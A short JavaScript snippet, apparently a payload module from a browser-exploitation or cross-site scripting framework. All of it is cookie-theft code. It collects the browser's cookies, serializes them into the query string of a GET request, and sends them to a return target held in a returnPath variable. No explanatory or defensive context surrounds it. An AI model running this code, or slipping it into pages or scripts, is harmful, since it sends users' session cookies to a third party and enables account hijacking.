

function done(resp) {
	console.log(resp);
}

ck = get_cookies();
var request = {};
request["method"] = "GET";
request["target"] = returnPath["target"];
request["resource"] = "/cookies?" + serialize(ck);

sendRequest(request,null,null,done);
